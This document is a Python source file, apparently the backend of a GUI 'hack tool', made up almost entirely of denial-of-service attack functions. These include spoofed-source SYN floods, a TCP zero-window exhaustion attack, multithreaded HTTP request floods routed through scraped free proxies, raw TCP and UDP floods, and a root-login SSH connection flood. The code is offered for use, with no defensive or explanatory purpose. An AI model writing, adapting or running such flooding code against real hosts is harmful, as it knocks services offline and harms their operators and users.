import _thread
import json
import os.path
import random
import socket
import sys
from socket import *
from time import sleep
from urllib import request
from urllib.request import Request

from PyQt5.QtWidgets import QApplication
from paramiko import SSHClient
import impacket.ImpactPacket
import warnings
from loguru import logger

from paramiko.client import AutoAddPolicy
from scapy.layers.inet import TCP, IP
from scapy.sendrecv import send, sr1

from PyQtUIs import HackToolMainUi

SELF_CONF_PATH = "./CONF/HTS.conf"
plist = []
snull = ''
CONFIG = {
    'log': 1,
}

# 取conf文件
def setConfValue(key, value):
    with open("./CONF/HTS.conf", 'w+') as f:
        nconf = json.load(f)
        # print(nconf)
        nconf[key] = value
        json.dump(nconf, f)
        f.close()


def verifyConfig(conf: dict) -> bool:
    with open("./CONF/HTS.conf", 'r') as f:
        try:
            nconf = json.load(f)
            # print(nconf)
            if nconf != conf:
                return False
            else:
                return True
        except:
            f.close()
            os.remove("./CONF/HTS.conf")
            f = open("./CONF/HTS.conf", 'x')
            f.close()
            initConfig(conf)
        f.close()


def isSnull(string: str):
    """Return True if the string is '', else return False."""
    if string == '':
        return True
    else:
        return False


def synAttack(urip, sourceport, tgtip, tgtport, thread):
    noPolIp = str(tgtip).replace('https://', '').replace('http://', '')
    tgtip = gethostbyname(noPolIp)
    warnings.filterwarnings("ignore")
    logger.info("Start Thread", 'yellow')

    def get(urip, sourceport, tgtip, tgtport):
        while True:
            try:
                ip = impacket.ImpactPacket.IP()
                tcp = impacket.ImpactPacket.TCP()

                ip.set_ip_src(urip)
                ip.set_ip_dst(tgtip)
                ip.set_ip_ttl(255)

                tcp.set_th_flags(0b00000010)
                tcp.set_th_sport(sourceport)
                tcp.set_th_dport(tgtport)
                tcp.set_th_ack(0)
                tcp.set_th_seq(22903)
                tcp.set_th_win(20000)

                ip.contains(tcp)
                ip.calculate_checksum()
                s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)
                s.sendto(ip.get_packet(), (f"{tgtip}", int(tgtport)))

                logger.info(f"SUCCESS", 'green')
            except Exception as e:
                logger.error(f"FAILED.{e}", 'red')
            finally:
                sleep(0)

    for i in range(1, thread + 1):
        _thread.start_new_thread(get, (urip, sourceport, tgtip, tgtport,))


def randomSynIp():
    return ".".join(map(str, (random.randint(0, 255) for i in range(4))))


def randomSynPort():
    return random.randint(1000, 55500)


def sockFullAttack(tgtip, tgtport, thread):
    logger.info("Start Thread", 'yellow')

    def get(tgtip, tgtport):
        while True:
            try:
                tgtip = gethostbyname(str(tgtip).replace('https://', '').replace('http://', ''))
                xport = random.randint(0, 65535)
                response = sr1(IP(dst=tgtip) / TCP(sport=xport, dport=tgtport, flags="S"), timeout=1, verbose=0)
                send(IP(dst=tgtip) / TCP(dport=tgtport, sport=xport, window=0, flags="A",
                                         ack=(response[TCP].seq + 1)) / '\x00\x00', verbose=0)
                logger.info(f"SUCCESS", 'green')
            except Exception as e:
                logger.error(f"FAILED.{e}", 'red')
            finally:
                sleep(0)

    for i in range(1, thread + 1):
        _thread.start_new_thread(get, (tgtip, tgtport,))


def synAttackBetter(srcip, tgtip, thread):
    def get(srcip, tgtip):


        tgtip = gethostbyname(str(tgtip).replace('https://', '').replace('http://', ''))
        logger.info(f'Start thread', 'yellow')
        while True:
            try:
                srcIP = str(srcip)
                IPlayer = IP(src=srcIP, dst=tgtip)
                srcPort = randomSynPort()
                TCPlayer = TCP(sport=srcPort, dport=randomSynPort(), flags="S")
                packet = IPlayer / TCPlayer
                send(packet)

            except Exception as e:
                logger.error(f'FAILED.{e}', 'red')
            finally:
                sleep(0)
            logger.info(f'SUCCESS', 'green')

    for i in range(1, thread + 1):
        _thread.start_new_thread(get, (srcip, tgtip))


def getKeyValue(key, conf: dict):
    f = open("./CONF/HTS.conf", 'r', encoding='utf-8')
    a = json.load(f)
    # print(a)
    return a[key]


def colormsg(msg: str, color: str = ""):
    if bool(getKeyValue('log', CONFIG)):
        str = ""
        if color.lower() == "red":
            str += "\033[1;31;40m"
        elif color.lower() == "green":
            str += "\033[1;32;40m"
        elif color.lower() == "yellow":
            str += "\033[1;33;40m"
        else:
            print(str + msg)
            return
        str += msg + "\033[0m"

        print(str)
    else:
        return


def toRequestUrl(pages: list) -> list:
    pages1 = pages
    if not (pages[0].startswith("http://") or pages[0].startswith("https://")):
        pages[0] = "http://" + pages[0]
        print(pages[0], pages1[0])
        return pages
    else:
        return pages1


def getProxies():
    import requests
    text1 = requests.get("https://www.89ip.cn/tqdl.html?api=1&num=9999").text
    text = text1.replace('''<a href="https://proxy.ip3366.net/" target="_blank" data-type="img"><img src="img/hfad.png"></a><br><script type="text/javascript" src="js/jquery.min.js"></script>
<div id="adarea"onclick=location.href='https://proxy.ip3366.net/' style="cursor: pointer;display: none;position: fixed;right:15px;bottom:15px;width: 285px;height: 250px;background: url(/img/fkad.png) no-repeat;">
<div id="adclose" style="cursor: pointer; position: absolute;  top: 0px;  right: 0px;  display: block;  width: 20px;  height: 20px;font-family: cursive;background: url(img/close.png) no-repeat;" title="点击关闭"> </div>
</div>
<script type="text/javascript">
$(function(){
$('#adarea').slideDown(500);
$('#adclose').click(function(){
$('#adarea').slideUp(500);
});
});
</script>''', '').replace('<br>', ' ').replace('\n', '').replace('更好用的代理ip请访问：https://proxy.ip3366.net/', '')
    with open('./proxies.txt', 'a') as f:
        f.write(text)
        f.close()
    return "OK, saved as proxies.txt"


def sendPacketAttack(host: list, thread: int, failnum: int = 15):
    headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36"
    }

    def get(page, headers: dict):
        logger.info("Start thread", 'yellow')
        fn = 0
        if failnum != -1:
            fn = 0
        else:
            fn = -191981011451466
        req = Request(str(page), headers=headers)
        if not os.path.exists('./proxies.txt'):
            while fn <= failnum:
                try:
                    request.urlopen(req).read()
                    logger.info("Success", "green")
                except Exception as e:
                    logger.warning  (f"Failed.{e}", 'red')
                    fn += 1
        else:
            while fn <= failnum:
                try:
                    proxy_handler = request.ProxyHandler({'http': f'http://{random.choice(makeProxiesList())}'})
                    opener = request.build_opener(proxy_handler)

                    opener.open(req).read()
                    logger.info("Success", 'green')
                except Exception as e:
                    logger.error(f"Failed.{e}", 'red')
                    fn += 1
        logger.info(f"ATK END", 'yellow')
        return

    for a in host:
        for i in range(1, thread + 1):
            _thread.start_new_thread(get, (a, headers))
    sleep(0)


def sshAttack(host, port, thread):
    logger.info("Thread Start!", "yellow")

    def get(host, port):
        host = gethostbyname(host)
        ssh = None
        while True:
            try:
                ssh = SSHClient()
                try:
                    ssh.load_system_host_keys()
                except:
                    logger.warning('请获取SSH的Host Key或安装SSH','red')
                ssh.connect(hostname=host, port=port, username="root", password='1145141919810FUCKU')
                logger.info("Success", 'green')
            except Exception as e:
                logger.warning(f"Failed.{e}", 'red')
            finally:
                sleep(0)
                ssh.close()

    for i in range(1, thread + 1):
        _thread.start_new_thread(get, (host, port,))

def tcpAttack(host: tuple, thread: int, num: int = 50):
    host1 = host
    logger.info("Thread Start!", "yellow")

    def sP(host, port):
        while 1:
            s = socket(AF_INET, SOCK_STREAM)

            try:
                s.connect((host, port))
                s.send((
                    "" * num).encode(
                    'utf-8'))
                logger.info("Success", 'green')


            except Exception as e:
                logger.warning(f"Failed.{e}", 'red')

            sleep(0)

    for i in range(1, thread + 1):
        _thread.start_new_thread(sP, (host[0], host[1]))


def udpAttack(ip, port, thread: int):
    logger.info("Thread Start!", "yellow")

    def get(ip, port):
        while 1:
            s = socket(AF_INET, SOCK_DGRAM)

            try:
                s.sendto(("AAa" * 10240).encode('Utf-8'), (ip, int(port)))
                logger.info("Success", 'green')

            except Exception as e:
                logger.warning(f"Failed.{e}", 'red')
            sleep(0)

    for i in range(1, thread + 1):
        _thread.start_new_thread(get, (ip, port))


def makeProxiesList():
    global plist
    try:

        with open('./proxies.txt', 'r') as f:

            plist = f.read().split(' ')
    except:
        return "Proxies file not found."
    return plist


def proxiesTo(path, mode):
    """Mode 1 将空格转换行 Mode2将换行转空格。"""
    try:
        if int(mode) == 1:
            f = open(path, 'r+')
            a = f.read().replace(' ', '\n')
            f.close()
            f = open(path, 'w+')
            f.write(a)
            f.close()

        elif int(mode) == 2:
            f = open(path, 'r+')
            a = f.read().replace('\n', ' ')
            f.close()
            f = open(path, 'w+')
            f.write(a)
            f.close()
        return f"成功转为模式{mode}"
    except Exception as e:
        return f"处理失败，{e}"


def initConfig(conf: dict):
    with open("./CONF/HTS.conf", 'w') as f:
        json.dump(conf, f)


def resetToNewConfig(conf: dict):
    if not verifyConfig(conf):
        initConfig(conf)
    else:
        pass
